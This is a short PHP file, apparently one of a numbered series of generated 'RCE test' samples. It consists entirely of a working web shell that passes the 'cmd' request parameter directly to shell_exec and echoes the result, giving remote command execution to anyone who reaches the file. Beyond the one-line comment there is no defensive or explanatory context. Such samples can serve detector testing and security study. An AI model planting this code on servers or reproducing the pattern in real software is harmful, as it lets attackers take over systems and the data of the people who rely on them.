<?php
// RCE test variation #1385
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>